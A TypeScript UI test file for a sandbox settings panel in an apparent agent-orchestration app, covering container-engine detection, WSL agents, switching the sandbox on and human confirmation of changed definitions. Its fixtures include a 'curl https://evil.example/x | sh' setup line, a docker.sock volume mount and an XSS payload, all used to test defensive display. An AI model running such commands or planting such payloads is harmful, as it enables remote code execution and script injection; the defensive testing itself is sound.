import { expect } from 'remix/assert';
import { afterEach, describe, it } from 'remix/test';
import type { Client } from '../../api/client.ts';
import type { SandboxStatus } from '../../api/extTypes.ts';
import { byLabel, byText, cleanup, mount, testServices, waitFor } from '../../test/render.tsx';
import { SandboxPanel, sandboxReady, sandboxSummary, sandboxTestable } from './project-sandbox.tsx';

afterEach(cleanup);

// waitFor retries what throws: a missing element is an error until it appears
const need = <T,>(x: T | null): T => {
  if (x === null) throw new Error('not there yet');
  return x;
};

const engine = { client: 'docker', version: '29.8.2', os: 'linux', arch: 'amd64' };
const ready: SandboxStatus = {
  switch: { enabled: false },
  engine,
  found: true,
  branch: 'main',
  configPath: '.drydock/sandbox.json',
  config: { image: 'node:24-trixie', setup: ['npm ci'], services: { db: { image: 'postgres:17' } }, network: 'allowlist' },
  hosts: ['registry.npmjs.org', 'api.stripe.com'],
};

function panel(client: Partial<Client>) {
  const s = testServices(client);
  return mount(<SandboxPanel projectId="p1" />, s);
}

describe('Sandbox settings', () => {
  it('summarises a definition and says when the switch can go on', () => {
    expect(sandboxSummary(ready)).toBe('image node:24-trixie; services db; network allowlist of 2 hosts; setup: npm ci');
    expect(sandboxReady(ready)).toBe(true);
    expect(sandboxReady({ ...ready, engine: undefined, engineError: 'no container engine is reachable' })).toBe(false);
    expect(sandboxReady({ ...ready, found: false })).toBe(false);
    expect(sandboxReady({ ...ready, egressError: 'the network allowlist needs drydock-egress-linux-amd64' })).toBe(false);
  });

  it('a project without a definition is shown one to start from, and cannot switch the sandbox on yet', async () => {
    const r = panel({
      sandboxStatus: async () => ({
        switch: { enabled: false },
        engine,
        found: false,
        branch: 'main',
        configPath: '.drydock/sandbox.json',
        configError: 'the project has no .drydock/sandbox.json on main: add one (the project settings suggest a starting point)',
        starter: '{\n  "image": "node:24-trixie"\n}',
      }),
    });
    const starter = await waitFor(() => need(r.container.querySelector<HTMLElement>('[data-testid="sandbox-starter"]')), r);
    expect(starter.textContent).toContain('"image": "node:24-trixie"');
    expect(starter.textContent).toContain('on main');
    expect(r.container.querySelector('[data-testid="sandbox-definition"]')!.textContent).toContain('has no .drydock/sandbox.json');
    expect(byLabel<HTMLInputElement>(r.container, "Run the agents' commands in a container for each task").disabled).toBe(true);
    expect(byText<HTMLButtonElement>(r.container, 'button', 'Test the sandbox').disabled).toBe(true);
  });

  it('a starter read from the compose file says which file and that its values are copied as they are (X35)', async () => {
    const base = {
      switch: { enabled: false },
      engine,
      found: false,
      branch: 'main',
      configPath: '.drydock/sandbox.json',
      configError: 'no definition',
      starter: '{\n  "image": "node:24-trixie",\n  "services": { "db": { "image": "postgres:17" } }\n}',
    };
    let r = panel({ sandboxStatus: async () => ({ ...base, starterFrom: ['docker-compose.yml', 'Dockerfile'] }) });
    const from = await waitFor(() => need(r.container.querySelector<HTMLElement>('[data-testid="sandbox-starter-from"]')), r);
    expect(from.textContent).toContain('Read from docker-compose.yml, Dockerfile.');
    expect(from.textContent).toContain('keep secrets out of env, which the agents see');
    cleanup();
    r = panel({ sandboxStatus: async () => base });
    await waitFor(() => need(r.container.querySelector<HTMLElement>('[data-testid="sandbox-starter"]')), r);
    expect(r.container.querySelector('[data-testid="sandbox-starter-from"]')).toBe(null);
  });

  it('without a container engine it says how to get one', async () => {
    const r = panel({ sandboxStatus: async () => ({ ...ready, engine: undefined, engineError: 'no container engine is reachable: docker is not installed or not on PATH' }) });
    const e = await waitFor(() => need(r.container.querySelector<HTMLElement>('[data-testid="sandbox-engine"]')), r);
    expect(e.textContent).toContain('not installed');
    expect(e.textContent).toContain('Install Docker Desktop');
    // a link to Docker Desktop's page, opened outside the app (A7)
    const get = r.container.querySelector<HTMLAnchorElement>('a[data-testid="sandbox-get-docker"]')!;
    expect(get.textContent).toBe('Get Docker Desktop');
    expect(get.getAttribute('href')).toBe('https://www.docker.com/products/docker-desktop/');
    expect(get.getAttribute('target')).toBe('_blank');
    expect(get.hasAttribute('data-rmx-document')).toBe(true);
  });

  it('notices Docker starting: Check again, the window getting the focus back and a poll while the engine is missing (A7)', async () => {
    let reads = 0;
    let current: SandboxStatus = { ...ready, engine: undefined, engineError: 'no container engine is reachable' };
    const r = mount(<SandboxPanel projectId="p1" enginePollMs={30} />, testServices({ sandboxStatus: async () => (reads++, current) }));
    const box = () => byLabel<HTMLInputElement>(r.container, "Run the agents' commands in a container for each task");
    await waitFor(() => expect(box().disabled).toBe(true), r);
    // the poll reads again while the engine is missing
    const before = reads;
    await waitFor(() => expect(reads).toBeGreaterThan(before + 1), r, 3000);
    // Check again reads now
    const n = reads;
    await r.act(() => need(r.container.querySelector<HTMLButtonElement>('[data-testid="sandbox-check-again"]')).click());
    await waitFor(() => expect(reads).toBeGreaterThan(n), r);
    // Docker started: the next read (here the window's focus) finds it and the switch can go on, with no reload of the page
    current = ready;
    await r.act(() => window.dispatchEvent(new Event('focus')));
    await waitFor(() => expect(r.container.querySelector('[data-testid="sandbox-engine"]')!.textContent).toContain('docker 29.8.2'), r);
    expect(box().disabled).toBe(false);
    expect(r.container.querySelector('[data-testid="sandbox-check-again"]')).toBe(null);
    // and the poll stops once it is there
    const settled = reads;
    await new Promise((res) => setTimeout(res, 200));
    expect(reads).toBe(settled);
  });

  it('names the agents in WSL before the switch is flipped, with a way to move them to Windows (X312)', async () => {
    const runModes: [string, string][] = [];
    let current: SandboxStatus = {
      ...ready,
      wslAgents: [
        { id: 'agt_1', name: 'Ada', followsProject: true },
        { id: 'agt_2', name: 'Ben' },
      ],
    };
    const r = panel({
      sandboxStatus: async () => current,
      projectSetRunMode: async (p, mode) => {
        runModes.push([p, mode]);
        current = { ...ready, wslAgents: [{ id: 'agt_2', name: 'Ben' }] };
        return { runMode: mode };
      },
    });
    const note = await waitFor(() => need(r.container.querySelector<HTMLElement>('[data-testid="sandbox-wsl"]')), r);
    expect(note.textContent).toContain('Ada, Ben run in WSL');
    expect(byLabel<HTMLInputElement>(r.container, "Run the agents' commands in a container for each task").disabled).toBe(true);
    // the definition can still be tried before the agents move: only the switch waits for them
    expect(byText<HTMLButtonElement>(r.container, 'button', 'Test the sandbox').disabled).toBe(false);
    // a chip per agent opens its editor
    expect(r.container.querySelector('a[data-testid="sandbox-wsl-agent-agt_2"]')!.getAttribute('href')).toBe('/team?edit=agt_2');
    await r.act(() => need(r.container.querySelector<HTMLButtonElement>('[data-testid="sandbox-wsl-native"]')).click());
    await waitFor(() => expect(r.container.querySelector('[data-testid="sandbox-wsl"]')!.textContent).toContain('Ben runs in WSL'), r);
    expect(runModes).toEqual([['p1', 'native']]);
    // only Ben's own setting keeps him there: no project-wide button any more
    expect(r.container.querySelector('[data-testid="sandbox-wsl-native"]')).toBe(null);
    expect(sandboxReady(current)).toBe(false);
    expect(sandboxReady({ ...current, wslAgents: [] })).toBe(true);
    expect(sandboxTestable(current)).toBe(true);
  });

  it('switches on through the core and then says who did it', async () => {
    const calls: [string, boolean][] = [];
    let current = ready;
    const r = panel({
      sandboxStatus: async () => current,
      sandboxSet: async (p, on) => {
        calls.push([p, on]);
        current = { ...ready, switch: { enabled: on, by: 'human:kyle', at: Date.UTC(2026, 9, 10, 12, 0) } };
        return current.switch;
      },
    });
    const box = await waitFor(() => byLabel<HTMLInputElement>(r.container, "Run the agents' commands in a container for each task"), r);
    expect(r.container.querySelector('[data-testid="sandbox-definition"]')!.textContent).toContain('.drydock/sandbox.json on main: image node:24-trixie');
    expect(box.disabled).toBe(false);
    await r.act(() => box.click());
    await waitFor(() => expect(calls).toEqual([['p1', true]]), r);
    await waitFor(() => expect(r.container.querySelector('[data-testid="sandbox-switch-note"]')!.textContent).toContain('Switched on by kyle'), r);
    expect(r.container.querySelector('[data-testid="sandbox-explain"]')!.textContent).toContain('no shell on this machine');
    expect(r.container.querySelector('[data-testid="sandbox-explain"]')!.textContent).toContain('Gemini CLI, Goose and Cline');
  });

  it('runs the test and shows each step', async () => {
    const r = panel({
      sandboxStatus: async () => ready,
      sandboxTest: async () => ({
        steps: [
          { name: 'container engine', ok: true, detail: 'docker 29.8.2 (linux/amd64)', durationMs: 40 },
          { name: 'start (pulls missing images, starts the services)', ok: false, detail: 'could not get image postgres:17', durationMs: 2300 },
        ],
      }),
    });
    const btn = await waitFor(() => byText<HTMLButtonElement>(r.container, 'button', 'Test the sandbox'), r);
    await r.act(() => btn.click());
    const steps = await waitFor(() => need(r.container.querySelector<HTMLElement>('[data-testid="sandbox-steps"]')), r);
    const items = Array.from(steps.querySelectorAll('li'));
    expect(items.map((li) => li.getAttribute('data-ok'))).toEqual(['true', 'false']);
    expect(items[1]!.textContent).toContain('could not get image postgres:17');
  });

  describe('a definition the person has not confirmed (M7)', () => {
    const on = { enabled: true, by: 'human:kyle', at: Date.UTC(2026, 9, 10, 12, 0) };
    const changed: SandboxStatus = {
      ...ready,
      switch: on,
      fingerprint: 'fp-1',
      trusted: false,
      changes: ['allowHosts added: evil.example', 'setup command added: curl https://evil.example/x | sh', 'network "allowlist" -> "open"'],
    };
    const callout = (r: ReturnType<typeof panel>) => r.container.querySelector<HTMLElement>('[data-testid="sandbox-untrusted"]');
    const lines = (r: ReturnType<typeof panel>) => Array.from(r.container.querySelectorAll('[data-testid="sandbox-changes"] li')).map((li) => li.textContent);

    it('says the definition changed since it was confirmed, lists what is different as text, and says tasks wait in Needs you', async () => {
      const r = panel({ sandboxStatus: async () => changed });
      const box = await waitFor(() => need(callout(r)), r);
      expect(box.getAttribute('role')).toBe('alert');
      expect(box.textContent).toContain('The sandbox definition changed since you confirmed it.');
      expect(lines(r)).toEqual(changed.changes);
      expect(box.textContent).toContain('Tasks of this project wait, in Needs you, until you confirm this definition.');
      expect(byText<HTMLButtonElement>(box, 'button', 'Confirm this definition').disabled).toBe(false);
      // one confirmation lets every held task go on, and the callout says so before the click (X38)
      expect(box.querySelector('[data-testid="sandbox-confirm-note"]')?.textContent).toContain(
        'lets every task of this project that waits for it go on',
      );
    });

    it('shows a line of the definition as the text it is, never as markup', async () => {
      const evil = '<img src=x onerror="window.__sandboxxss=1"> setup command added: <script>window.__sandboxxss=1</script>';
      const r = panel({ sandboxStatus: async () => ({ ...changed, changes: [evil] }) });
      await waitFor(() => need(callout(r)), r);
      expect(lines(r)).toEqual([evil]);
      expect(callout(r)!.querySelector('img, script')).toBeNull();
      expect((window as unknown as Record<string, unknown>).__sandboxxss).toBeUndefined();
    });

    it('says what a definition that was never confirmed is, from the core\'s own description', async () => {
      const r = panel({ sandboxStatus: async () => ({ ...changed, changes: ['no definition has been confirmed yet; this one has image "node:24-trixie", network "allowlist"'] }) });
      await waitFor(() => need(callout(r)), r);
      expect(lines(r)).toEqual(['no definition has been confirmed yet; this one has image "node:24-trixie", network "allowlist"']);
    });

    it('confirms exactly the definition that was shown (its fingerprint), then reads the status again and the warning is gone', async () => {
      const calls: [string, string][] = [];
      let current: SandboxStatus = changed;
      const r = panel({
        sandboxStatus: async () => current,
        sandboxTrust: async (p, fp) => {
          calls.push([p, fp]);
          current = { ...changed, trusted: true, changes: undefined };
          return on;
        },
      });
      const box = await waitFor(() => need(callout(r)), r);
      await r.act(() => byText<HTMLButtonElement>(box, 'button', 'Confirm this definition').click());
      await waitFor(() => expect(calls).toEqual([['p1', 'fp-1']]), r);
      await waitFor(() => expect(callout(r)).toBeNull(), r);
    });

    it('a definition that changed again in between is refused with the core\'s words and the newer changes are shown to read again', async () => {
      const calls: string[] = [];
      let current: SandboxStatus = changed;
      const r = panel({
        sandboxStatus: async () => current,
        sandboxTrust: async (_p, fp) => {
          calls.push(fp);
          if (fp !== current.fingerprint) throw new Error('the definition changed since you looked at it: read it again before you confirm');
          current = { ...current, trusted: true, changes: undefined };
          return on;
        },
      });
      const box = await waitFor(() => need(callout(r)), r);
      current = { ...changed, fingerprint: 'fp-2', changes: [...changed.changes!, 'volumes added: /var/run/docker.sock'] };
      await r.act(() => byText<HTMLButtonElement>(box, 'button', 'Confirm this definition').click());
      await waitFor(() => expect(r.container.querySelector('[role="alert"] strong')?.textContent).toBe('Not confirmed: '), r);
      expect(r.container.textContent).toContain('the definition changed since you looked at it: read it again before you confirm');
      await waitFor(() => expect(lines(r)).toContain('volumes added: /var/run/docker.sock'), r);
      expect(callout(r)).not.toBeNull();
      // the second click confirms what is shown now
      await r.act(() => byText<HTMLButtonElement>(callout(r)!, 'button', 'Confirm this definition').click());
      await waitFor(() => expect(calls).toEqual(['fp-1', 'fp-2']), r);
      await waitFor(() => expect(callout(r)).toBeNull(), r);
    });

    it('shows nothing while the definition is the confirmed one', async () => {
      const r = panel({ sandboxStatus: async () => ({ ...changed, trusted: true, changes: undefined }) });
      await waitFor(() => need(r.container.querySelector('[data-testid="sandbox-switch-note"]')), r);
      expect(callout(r)).toBeNull();
    });

    it('shows nothing while the sandbox is off (switching it on confirms the definition), or without a valid definition, or from a core that does not say', async () => {
      const off = panel({ sandboxStatus: async () => ({ ...changed, switch: { enabled: false }, trusted: false }) });
      await waitFor(() => need(off.container.querySelector('[data-testid="sandbox-definition"]')), off);
      expect(callout(off)).toBeNull();
      cleanup();
      const none = panel({ sandboxStatus: async () => ({ ...changed, found: false, fingerprint: undefined, config: undefined, configError: 'the definition does not parse' }) });
      await waitFor(() => need(none.container.querySelector('[data-testid="sandbox-definition"]')), none);
      expect(callout(none)).toBeNull();
      cleanup();
      // a status that says nothing about trust (an older core, or a field that did not arrive) is not "not trusted"
      const old = panel({ sandboxStatus: async () => ({ ...ready, switch: on, fingerprint: 'fp-1' }) });
      await waitFor(() => need(old.container.querySelector('[data-testid="sandbox-switch-note"]')), old);
      expect(callout(old)).toBeNull();
    });
  });
});
